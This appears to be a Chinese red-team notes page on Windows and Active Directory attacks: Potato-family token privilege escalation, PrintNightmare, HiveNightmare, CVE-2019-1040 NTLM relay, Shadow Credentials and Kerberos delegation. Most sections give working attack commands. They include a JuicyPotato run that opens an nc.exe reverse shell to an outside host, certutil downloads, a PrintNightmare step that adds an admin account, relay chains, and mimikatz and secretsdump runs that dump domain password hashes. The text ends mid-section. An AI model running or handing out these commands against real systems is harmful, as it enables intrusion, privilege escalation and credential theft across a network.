+<h2 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a><strong>土豆家族</strong></h2><p>利用 Potato 提权的是前提是拥有<strong>SeImpersonatePrivilege</strong>或<strong>SeAssignPrimaryTokenPrivilege</strong>权限</p>
+<blockquote>
+<p>当用户具有<strong>SeImpersonatePrivilege</strong>特权，则可以调用<strong>CreateProcessWithTokenW</strong>以某个<strong>Token</strong>的权限启动新进程</p>
+<p>当用户具有<strong>SeAssignPrimaryTokenPrivilege</strong>特权，则可以调用<strong>CreateProcessAsUserW</strong>以<strong>hToken</strong>权限启动新进程</p>
+</blockquote>
+<p>为什么会有一系列<code>Impersonate</code>函数，微软本意是让高权限服务端可以模拟低权限客户端来执行操作以提高安全性，但被攻击者反向使用了</p>
+<h3 id="MS08-068-NTLM反射Origin-Potato"><a href="#MS08-068-NTLM反射Origin-Potato" class="headerlink" title="MS08-068 NTLM反射Origin Potato"></a><strong>MS08-068 NTLM反射Origin Potato</strong></h3><p>把用户SMB请求 中继到其自身。</p>
+<p>SMB 协议中的 NTLM 反射漏洞仅针对 Windows 2000 到 Windows Server 2008</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msf <span class="token operator">></span> use exploit/windows/smb/smb_relay
+msf exploit<span class="token punctuation">(</span>smb_relay<span class="token punctuation">)</span> <span class="token operator">></span> show targets</code></pre>
+
+<h3 id="CVE-2019-1384-Ghost-Potato"><a href="#CVE-2019-1384-Ghost-Potato" class="headerlink" title="CVE-2019-1384 Ghost Potato"></a><strong>CVE-2019-1384 Ghost Potato</strong></h3><p>这个漏洞绕过了 <code>MS08-068</code> 之后，用户不能 <code>relay</code> 回本机的限制</p>
+<p>当我们存在两个主机进行SMB通信时，A向B发送了NTLM_NEGOTIAT请求，同时他将自己的<code>pszTargetName</code>设置为<code>cifs/B</code>，当拿到NTLM_CHALLENGE的challenge时，向<code>lsass</code>进程写入缓存<code>Challenge cifs/B</code>。之后A向B发送<code>NTLM_AUTH</code>,B接收后回到lsass中寻找是否存在<code>Chllenge cifs/B</code>,因为只有主机A写入了，B没有，所有B不存在缓存，这样SMB就不是一台主机，限制了<code>MS08-068</code></p>
+<p>而CVE-2019-1384绕过了找个限制，因为lsass中的缓存<code>Challenge cifs/B</code>会在300s后消失</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">responder <span class="token parameter variable">-I</span> eth0 <span class="token parameter variable">--lm</span>
+ntlmrelayx.py <span class="token parameter variable">-t</span> smb://192.168.91.2 <span class="token parameter variable">-smb2support</span> --gpotato-startup beacon.exe</code></pre>
+
+<h3 id="MS16-075-HOT-Potato"><a href="#MS16-075-HOT-Potato" class="headerlink" title="MS16-075 HOT Potato"></a><strong>MS16-075 HOT Potato</strong></h3><p>MS08-068的变种</p>
+<p>MS08-068虽然限制了同台主机之间smb到smb的Relay，但是并没有限制从http到smb</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> /all
+<span class="token function">whoami</span> /priv
+如果开启SeImpersonate权限，juicypotato的参数可以使用 <span class="token parameter variable">-t</span> t
+如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用 <span class="token parameter variable">-t</span> u
+如果均开启，可以选择-t * 如果均未开启，那么无法提权</code></pre>
+
+<p>根据系统找CLSID</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list">https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list</a></p>
+<p>找到SYSTEM的CLSID</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>websvc<span class="token punctuation">\</span>Desktop<span class="token operator">></span>certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://192.168.1.106:6677/CLSID.list
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>websvc<span class="token punctuation">\</span>Desktop<span class="token operator">></span>certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://192.168.1.106:6677/test_clsid.bat</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">JuicyPotato.exe <span class="token parameter variable">-l</span> <span class="token number">1337</span> <span class="token parameter variable">-c</span> <span class="token string">"&#123;659cdea7-489e-11d9-a9cd-000d56965251&#125;"</span> <span class="token parameter variable">-p</span> c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>cmd.exe <span class="token parameter variable">-a</span> <span class="token string">"/c C:\Users\websvc\Desktop<span class="token entity" title="\n">\n</span>c.exe 192.168.1.105 4444 -e cmd.exe"</span> <span class="token parameter variable">-t</span> *</code></pre>
+
+<h3 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a><strong>Rotten Potato</strong></h3><p>MS16-075的变种</p>
+<blockquote>
+<p>1.欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。<br>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p>
+</blockquote>
+<h3 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a><strong>Juicy Potato</strong></h3><p>MS16-075的变种</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">https://github.com/ohpe/juicy-potato</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、加载COM，发出请求，权限为System 在指定ip和端口的位置尝试加载一个COM对象。
+RottenPotatoNG使用的COM对象为BITS，CLSID为<span class="token punctuation">&#123;</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="token punctuation">&#125;</span>
+可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
+<span class="token number">2</span>、回应步骤1的请求，发起NTLM认证 正常情况下，由于权限不足，当前权限不是System，无法认证成功。
+
+<span class="token number">3</span>、针对本地端口，同样发起NTLM认证，权限为当前用户 由于权限为当前用户，所以NTLM认证能够成功完成。
+RottenPotatoNG使用的135端口。 Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。
+
+<span class="token number">4</span>、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1<span class="token punctuation">(</span>权限为System<span class="token punctuation">)</span>的NTLM认证通过，获得System权限的Token
+重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。
+
+<span class="token number">5</span>、利用System权限的Token创建新进程
+如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。
+如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</code></pre>
+
+<p>使用通HOT Potato</p>
+<h3 id="Sweet-Potato"><a href="#Sweet-Potato" class="headerlink" title="Sweet Potato"></a><strong>Sweet Potato</strong></h3><p><code>Juicy Potato</code> 的重写 COM&#x2F;WinRM&#x2F;Spoolsv<code>的集合版，也就是</code>Juicy&#x2F;PrintSpoofer</p>
+<h3 id="Print-Spoofer"><a href="#Print-Spoofer" class="headerlink" title="Print Spoofer"></a><strong>Print Spoofer</strong></h3><p>又叫<code>PipePotato</code> <code>BadPotato</code></p>
+<p>通过Windows named pipe的一个API: <code>ImpersonateNamedPipeClient</code>来模拟高权限客户端的token（还有类似的<code>ImpersonatedLoggedOnUser</code>，<code>RpcImpersonateClient</code>函数），调用该函数后会更改当前线程的安全</p>
+<p>当传递<code>\\127.0.0.1/pipe/foo</code>时，校验路径时会认为<code>127.0.0.1/pipe/foo</code>是主机名，随后在连接<code>named pipe</code>时会对参数做标准化，将<code>/</code>转化为<code>\</code>，于是就会连接<code>\\127.0.0.1\pipe\foo\pipe\spoolss</code>，攻击者就可以注册这个<code>named pipe</code>从而窃取<code>client</code>的<code>token</code></p>
+<h3 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a><strong>RoguePotato</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
+<p>这个也是利用了命名管道</p>
+<p>微软修补后，高版本Windows DCOM解析器不允许OBJREF中的DUALSTRINGARRAY字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的135端口做流量转发，将其转回受害者本机端口，并写了一个恶意RPC OXID解析器&#96;</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">RoguePotato.exe <span class="token parameter variable">-r</span> 攻击机ip <span class="token parameter variable">-e</span> <span class="token string">"whoami"</span> <span class="token parameter variable">-l</span> <span class="token number">9999</span>
+
+kali:
+socat tcp-listen:135,reuseaddr,fork tcp:靶机ip:9999</code></pre>
+
+
+
+<h2 id="CVE-2021-1675-Windows-Print-Spooler"><a href="#CVE-2021-1675-Windows-Print-Spooler" class="headerlink" title="CVE-2021-1675 Windows Print Spooler"></a><strong>CVE-2021-1675 Windows Print Spooler</strong></h2><blockquote>
+<p>Print Spooler是Windows系统中管理打印相关事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启 Print Spooler 服务，普通用户可以利用此漏洞提升至SYSTEM管理权限</p>
+<p>在CVE-2021-1675的EXP中，调用RPC函数为RpcAddPrinterDriverEx，系统处理这个RPC函数后，但是没有对参数dwFileCopyFlags进行条件判断。如果此时dwFileCopyFlags设置为APD_INSTALL_WARNED_DRIVER标志，就可以实现低权限添加打印机驱动时，以高权限加载DLL</p>
+</blockquote>
+<p>检测说明漏洞存在</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">REG QUERY <span class="token string">"HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"</span>
+
+HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>Software<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows NT<span class="token punctuation">\</span>Printers<span class="token punctuation">\</span>PointAndPrint
+    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
+    NoWarningNoElevationOnInstall    REG_DWORD    0x1</code></pre>
+
+<p>利用</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Import-Module .<span class="token punctuation">\</span>cve-2021-1675.ps1
+Invoke-Nightmare <span class="token parameter variable">-DriverName</span> <span class="token string">"PrintTest"</span> <span class="token parameter variable">-NewUser</span> <span class="token string">"tao0845"</span> <span class="token parameter variable">-NewPassword</span> <span class="token string">"123"</span>  <span class="token comment">#创建管理员用户</span>
+
+<span class="token comment">#反弹shell</span>
+Import-Module C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>CVE-2021-1675.ps1    
+Invoke-Nightmare <span class="token parameter variable">-DLL</span> reverse.dll</code></pre>
+
+<h2 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a><strong>HiveNightmare</strong></h2><p>icacls检查漏洞</p>
+<p>CVE-2021-36934</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;GossiTheDog&#x2F;HiveNightmare
+执行成功会生成3个文件 SAM SECURITY SYSTEM
+直接拿去导出密码</code></pre>
+
+
+
+<h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a><strong>CVE-2019-1040</strong></h2><blockquote>
+<p>攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制Windows域内的任何机器，包括域控服务器。</p>
+</blockquote>
+<p><strong>NTLM身份验证由3种消息类型组成：</strong>NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。微软为了在NTLM协商阶段防止中间人攻击，在最终的NTLM身份验证消息（NTLM_AUTHENTICATE）添加了一个额外字段——MIC，msvAvFlag字段表示该消息是否包含MIC，Flags:0x00000002表示该消息包含MIC字段。MIC是一个HMAC_MD5值，应用于3种NTLM消息的会话密钥，只有初始认证的账户和目标服务器知道。所以攻击者试图篡改消息时，由于无法生成相应的MIC，会导致攻击失败。但是该漏洞成因在于Microsoft服务器并不验证’msvAvFlag’字段，即服务器允许无MIC的NTLM_AUTHENTICATE消息，这使得不强制执行签名的服务器容易受到中间人攻击</p>
+<p><strong>该漏洞目前有两种攻击途径：</strong></p>
+<p>**(1)**使用任何AD帐户，通过SMB连接到受害者Exchange服务器，并触发SpoolService错误。攻击者服务器将通过SMB连接回您，SMB可以使用修改版本的ntlmrelayx中继到LDAP。使用中继LDAP身份验证，向攻击者帐户授予DCSync权限。攻击者帐户现在可以使用DCSync转储AD中的所有密码哈希。</p>
+<p>**(2)**使用任何AD帐户，通过SMB连接到受害者服务器，并触发SpoolService错误。攻击者服务器将通过SMB连接回您，SMB可以使用修改版本的ntlmrelayx中继到LDAP。使用中继LDAP身份验证，将受害者服务器的基于资源的受限委派权限授予攻击者控制下的计算机帐户。攻击者现在可以作为受害者服务器上的任何用户进行身份验证。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#方法一利用exchange服务器</span>
+python3 printerbug.py rootkit.org/jerry@192.168.3.144 <span class="token number">192.168</span>.3.4  <span class="token comment">#利用打印机漏洞，使jerry用户对kali进行认证</span>
+ntlmrelayx.py --remove-mic --escalate-use jerry <span class="token parameter variable">-t</span> ldap://192.168.3.9 <span class="token parameter variable">-smb2support</span> <span class="token comment">#ntlm中继到域控LDAP</span>
+python3 secretsdump.py rootkit.org/jerry@192.168.3.9 -just-dc  <span class="token comment">#如果提升到writeACL权限就能dump 哈希</span>
+
+<span class="token comment">#利用二Kerberos委派攻击</span>
+python3 addcomputer.py -computer-name <span class="token string">'9z1nc'</span> -computer-pass <span class="token string">'9z1nc'</span> -dc-ip <span class="token number">192.168</span>.3.9 <span class="token string">'rootkit.org/jerry:Admin12345'</span> <span class="token parameter variable">-method</span> SAMR <span class="token parameter variable">-debug</span>  <span class="token comment">#在受控机器上添加一个机器设置约束委派</span>
+ntlmrelayx.py --remove-mic --escalate-user 9z1nc$ <span class="token parameter variable">-t</span> ldap://192.168.3.144 <span class="token parameter variable">-smb2support</span> --delegate-access <span class="token comment">#NTLM中继使机器账户拿到域控的委派权限</span>
+python3 printerbug.py rootkit.org/jerry:Admin12345@192.168.3.9 <span class="token number">192.168</span>.3.4 <span class="token comment">#触发认证即可拿到委派权限</span>
+getST.py <span class="token parameter variable">-spn</span> host/dc.rootkit.org <span class="token string">'rootkit.org'</span>/<span class="token string">'9z1nc$:9z1nc'</span> <span class="token parameter variable">-impersonate</span> administrator <span class="token comment">#拿到域管的TGT</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator@host_dc.rootkit.org@ROOTKIT.ORG.ccache
+secretsdump.py <span class="token parameter variable">-k</span> -no-pass dc.rootkit.org -just-dc <span class="token comment">#利用域管票据dump哈希</span></code></pre>
+
+<h2 id="Shadow-Credentials"><a href="#Shadow-Credentials" class="headerlink" title="Shadow Credentials"></a><strong>Shadow Credentials</strong></h2><p>在获取高权限用户后，通过给目标用户添加Shadow Credential（msDS-KeyCredentialLink属性），结合相关攻击工具获取到<code>.pfx</code>私钥证书文件，之后使用<code>.pfx</code>文件申请目标用户的TGT，进而得到其NTLM Hash</p>
+<p>也就是说<strong>只要能改变某个账号的msDS-KeyCredentialLink属性，就能获得这个账号的TGT和NTLM Hash</strong></p>
+<p>以下用户具有修改msDS-KeyCredentialLink属性的权限：</p>
+<pre class="language-none"><code class="language-none">域管理员（Domain Admins组成员）
+高权限用户（具有GenericAll或GenericWrite权限）
+Enterprise Key Admins组成员
+Key Admins组成员
+机器账户（修改自身）</code></pre>
+
+<p>条件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">域控制器版本在Windows Server <span class="token number">2016</span>以上
+域控制器上安装Active Directory证书服务（AD CS）或者其他服务器上安装AD CS</code></pre>
+
+
+
+<p><strong>PKINIT</strong></p>
+<p>在Kerberos认证协议中，TGT只能通过验证一个名为 “预认证 “的第一步来获得，预认证可以以对称方式（用DES、RC4、AES128或AES256密钥）或非对称方式（用证书）进行验证。非对称的预认证方式被称为<code>PKINIT</code>。</p>
+<p>PKINIT是一个Kerberos协议的扩展协议，允许Kerberos预认证阶段中使用非对称密钥进行加密。基于PKINIT协议，客户端使用自身私钥对预验证数据（Pre-authentication Data）进行加密，KDC使用客户端的公钥进行解密（与数字证书相似）。</p>
+<p>当公钥被设置在目标的msDs-KeyCredentialLink中时，生成的证书可以用Pass-the-Certificate来获得TGT和进一步的访问。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.客户端使用Client私钥加密Client证书和时间戳，发送给KDC
+<span class="token number">2</span>.KDC使用Client公钥验证Client证书链的合法性以及确认解密后的时间戳正常
+<span class="token number">3</span>.KDC返回TGT和会话密钥（Session Key）</code></pre>
+
+<p><strong>攻击思路1：域内机器修改影子凭证</strong></p>
+<p>在已获取到高权限的用户（如administrator）后，执行Shadow Credentials攻击，实现权限维持。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 向域控制器的msDS-KeyCredentialLink属性添加Shadow Credentials</span>
+Whisker.exe <span class="token function">add</span> /target:DC2016$ /domain:redteam.lab /dc:DC2016.redteam.lab
+<span class="token comment">#修改成功后，工具会提示出下一步的利用代码,即使用Rubeus通过证书获取申请该用户的TGT</span>
+Rubeus.exe asktgt /user:DC2016$ /certificate:<span class="token punctuation">[</span>value<span class="token punctuation">]</span> /password:<span class="token string">"1fxDXbHQvbZpHm0S"</span> /domain:redteam.lab /dc:DC2016.redteam.lab /getcredentials /show /nowrap /ptt          <span class="token comment">#/ptt将得到的TGT传递到内存中</span>
+如果没有添加入Shadow Credentials，则会报KDC_ERR_CLIENT_NAME_MISMATCH错误
+
+
+klist <span class="token comment">#查看当即机器内存缓存的TGT</span>
+
+mimikatz.exe <span class="token string">"lsadump::dcsync /domain:redteam.lab /user:redteam\Administrator"</span> <span class="token string">"exit"</span> <span class="token comment">#使用mimikatz执行 DCSync 来导出域用户哈希</span>
+
+<span class="token comment">#使用Rubeus工具，申请CIFS服务票据，访问目标服务</span>
+Rubeus.exe s4u /self /impersonateuser:REDTEAM<span class="token punctuation">\</span>Administrator /altservice:CIFS/DC2016.redteam.lab /dc:DC2016.redteam.lab /ptt /ticket:<span class="token punctuation">[</span>value<span class="token punctuation">]</span> /nowrap
+<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>DC2016.redteam.lab<span class="token punctuation">\</span>c$
+
+<span class="token comment">#当mark密码被修改时，我们将不在拥有mark的控制权，但是msDS-KeyCredentialLink属性已经被修改，可以通过以下方式恢复权限</span>
+Rubeus.exe asktgt /user:DC2016$ /certificate:<span class="token punctuation">[</span>value<span class="token punctuation">]</span> /password:<span class="token string">"1fxDXbHQvbZpHm0S"</span> /domain:redteam.lab /dc:DC2016.redteam.lab /getcredentials /show /ptt /nowrap
+
+<span class="token comment">#也可以将申请到的Base64加密的TGT转换为kirbi文件保存使用</span>
+powerpick <span class="token punctuation">[</span>IO.File<span class="token punctuation">]</span>::WriteAllBytes<span class="token punctuation">(</span><span class="token string">"C:\Users\Public\Documents<span class="token entity" title="\t">\t</span>icket.kirbi"</span>,<span class="token punctuation">[</span>Convert<span class="token punctuation">]</span>::FromBase64String<span class="token punctuation">(</span><span class="token string">"BASE64字符串"</span><span class="token punctuation">))</span>
+mimikatz.exe <span class="token string">"kerberos::ptt ticket.kirbi"</span> <span class="token string">"exit"</span>
+mimikatz.exe <span class="token string">"lsadump::dcsync /domain:redteam.lab /user:redteam\Administrator"</span> <span class="token string">"exit"</span>
+
+<span class="token comment">#也可以将申请到的Base64加密的TGT转换为.ccache文件，便于结合impacket套件使用</span>
+rubeustoccache.py BASE64字符串 test.kirbi test.ccache
+<span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>test.ccache
+secretsdump.py <span class="token parameter variable">-k</span> redteam.lab/DC2016<span class="token punctuation">\</span><span class="token variable">$@</span>DC2016.redteam.lab -no-pass -just-dc
+
+
+
+<span class="token comment"># 列出域控的msDS-KeyCredentialLink属性</span>
+Whisker.exe list /target:DC2016$ /domain:redteam.lab /dc:DC2016.redteam.lab
+
+<span class="token comment"># 删除属性msDS-KeyCredentialLink属性</span>
+Whisker.exe remove /target:DC2016$ /deviceid:33d43eb3-3cb2-4e63-ba92-7de00af46505</code></pre>
+
+
+
+<p><strong>攻击思路2：域外机器修改影子凭证</strong></p>
+<p>当我们只获得到一个高权限域用户凭证（用户&amp;密码），但是没有shell，可以使用<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/pywhisker">pyWhisker</a>工具可实现在域网络外的主机上进行攻击操作</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 对域控制器账户执行攻击，生成证书</span>
+python3 pywhisker.py <span class="token parameter variable">-d</span> <span class="token string">"redteam.lab"</span> <span class="token parameter variable">-u</span> <span class="token string">"mark"</span> <span class="token parameter variable">-p</span> <span class="token string">"123.com"</span> <span class="token parameter variable">--target</span> <span class="token string">"DC2016$"</span> <span class="token parameter variable">--action</span> <span class="token string">"add"</span> <span class="token parameter variable">--filename</span> dc2016</code></pre>
+
+<p>会获得一个.pfx证书</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a>通过KDC身份验证，申请到票据</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python3 gettgtpkinit.py -cert-pfx dc2016.pfx -pfx-pass JdhrfLCa3OMQJwfK8YhS redteam.lab/DC2016$ DC2016.ccache</code></pre>
+
+<p>导出哈希</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>DC2016.ccache 
+secretsdump.py <span class="token parameter variable">-k</span> redteam.lab/DC2016<span class="token variable">$@</span>DC2016.redteam.lab -no-pass -just-dc 
+<span class="token comment">#Hash登录</span>
+wmiexec.py <span class="token parameter variable">-hashes</span> :83a140d89e42046e8daf5394d386a69a redteam.lab/administrator@DC2016.redteam.lab -dc-ip <span class="token number">10.10</span>.2.20</code></pre>
+
+<p>或者使用TGT利用S4U2Self申请CIFS的ST</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gets4uticket.py kerberos+ccache://pentest.com<span class="token punctuation">\</span><span class="token punctuation">\</span>dc01<span class="token punctuation">\</span>$:dc01.ccache@dc01.pentest.com cifs/dc01.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache <span class="token parameter variable">-v</span></code></pre>
+
+<p>然后导入.ccache</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>/root/PKINITtools/Administrator.ccache
+smbexec.py <span class="token parameter variable">-k</span> pentest.com/Administrator@dc01.pentest.com -no-pass</code></pre>
+
+<p><strong>攻击思路3：影子凭证强制认证</strong></p>
+<p>Shadow Credentials可以联动NTLM Relay攻击，针对目标主机，强制修改其 <code>msDS-KeyCredentialLink</code> 属性，实现对目标机器持久和隐蔽的访问</p>
+<p>在最新版本的<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a>工具中，实现了影子凭证技术，通过添加<code>--shadow-credentials --shadow-target</code>两个参数来启用。该攻击可以与PetitPotam、printerbug或ShadowCoerce等强制认证结合使用</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#启动监听</span>
+ntlmrelayx.py <span class="token parameter variable">-t</span> ldap://10.10.2.20 --remove-mic --shadow-credentials --shadow-target SERVER2016$ 
+
+<span class="token comment">#执行NTLM Relay攻击,使用PetitPotam.py进行强制认证</span>
+PetitPotam.py <span class="token parameter variable">-u</span> mark <span class="token parameter variable">-p</span> <span class="token number">123</span>.com <span class="token parameter variable">-d</span> redteam.lab <span class="token number">10.10</span>.2.77 SERVER2016.redteam.lab
+
+<span class="token comment">#申请TGT票据</span>
+gettgtpkinit.py -cert-pfx SERVER2016.pfx -pfx-pass qOBBCYvuLnELkIS7sBAt redteam.lab/SERVER2016$ SERVER2016.ccache
+
+<span class="token comment">#申请CIFS ST，由于不是域控，不能进行DCSync攻击</span>
+gets4uticket.py kerberos+ccache://redteam.lab<span class="token punctuation">\</span><span class="token punctuation">\</span>SERVER2016<span class="token punctuation">\</span>$:SERVER2016.ccache@DC2016.redteam.lab cifs/SERVER2016.redteam.lab@redteam.lab Administrator@redteam.lab Administrator.ccache <span class="token parameter variable">-v</span>
+<span class="token comment">#但可以使用getnthash.py工具得到机器账户的SERVER2016$NTLM Hash</span>
+<span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>SERVER2016.ccache 
+getnthash.py <span class="token parameter variable">-key</span> 8281288a206035ebaab9e37066f06a5beeeaa699c4616e156894a3134ea22735  redteam.lab/SERVER2016$
+或者使用票据远程访问cifs
+<span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>Administrator.ccache 
+wmiexec.py <span class="token parameter variable">-k</span> redteam.lab/administrator@SERVER2016.redteam.lab -no-pass -dc-ip <span class="token number">10.10</span>.2.25</code></pre>
+
+
+
+
+
+<h2 id="Keberos委派"><a href="#Keberos委派" class="headerlink" title="Keberos委派"></a><strong>Keberos委派</strong></h2><p>委派是域中的一种属性设置，是一个安全敏感的操作。是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。</p>
+<p>需要注意的一点是接受委派的用户只能是 <code>服务账户</code> 或者 <code>计算机用户</code>。</p>
+<p>需要<code>SeEnableDelegation</code>特权才能配置约束和非约束委派。</p>
+<h3 id="枚举委派"><a href="#枚举委派" class="headerlink" title="枚举委派"></a><strong>枚举委派</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">findDelegation.py <span class="token string">"&lt;domain>"</span>/<span class="token string">"&lt;user>"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;password>"</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Bloodhound</span>
+
+<span class="token comment">#非约束委派</span>
+MATCH <span class="token punctuation">(</span>c:Computer <span class="token punctuation">&#123;</span>unconstraineddelegation:true<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> RETURN c
+MATCH <span class="token punctuation">(</span>c:User <span class="token punctuation">&#123;</span>unconstraineddelegation:true<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> RETURN c
+<span class="token comment">#约束委派</span>
+ATCH <span class="token assign-left variable">p</span><span class="token operator">=</span><span class="token variable"><span class="token punctuation">((</span>c<span class="token operator">:</span>Base<span class="token punctuation">)</span><span class="token operator">-</span>[<span class="token operator">:</span>AllowedToDelegate]<span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>t<span class="token operator">:</span>Computer<span class="token punctuation">))</span></span> RETURN p
+MATCH <span class="token assign-left variable">p</span><span class="token operator">=</span>shortestPath<span class="token variable"><span class="token punctuation">((</span>u<span class="token operator">:</span>User<span class="token punctuation">)</span><span class="token operator">-</span>[<span class="token operator">*</span><span class="token number">1.</span>.]<span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>c<span class="token operator">:</span>Computer 
+&#123;name<span class="token operator">:</span> "<span class="token operator">&lt;</span>MYTARGET.FQDN<span class="token operator">></span>"&#125;<span class="token punctuation">))</span></span> RETURN p</code></pre>
+
+
+
+<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a><strong>非约束委派</strong></h3><p>非约束性委派，服务账号可以获取被委派用户的 <code>TGT</code> ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250726094954178.png" alt="image-20250726094954178" loading="lazy"></p>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含 <code>WORKSTATION_TRUSTED_FOR_DELEGATION</code></p>
+<p>还有个Flag 位<code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>， 其对应的数是<code>0x80200=524800</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#枚举</span>
+<span class="token comment">#使用PowerShellEmpire版本的Powerview</span>
+<span class="token comment"># 导入 PowerView 脚本</span>
+import-module .<span class="token punctuation">\</span>powerview.ps1
+
+<span class="token comment"># 查询域内非约束性委派的计算机</span>
+Get-NetComputer <span class="token parameter variable">-Unconstrained</span> <span class="token parameter variable">-Domain</span> zjun.com <span class="token operator">|</span> <span class="token keyword">select</span> name
+
+<span class="token comment"># 查询域内非约束性委派的服务账号</span>
+Get-NetUser <span class="token parameter variable">-Unconstrained</span> <span class="token parameter variable">-Domain</span> zjun.com <span class="token operator">|</span> <span class="token keyword">select</span> name</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#使用Adfind</span>
+<span class="token comment"># 查询域内非约束性委派的计算机</span>
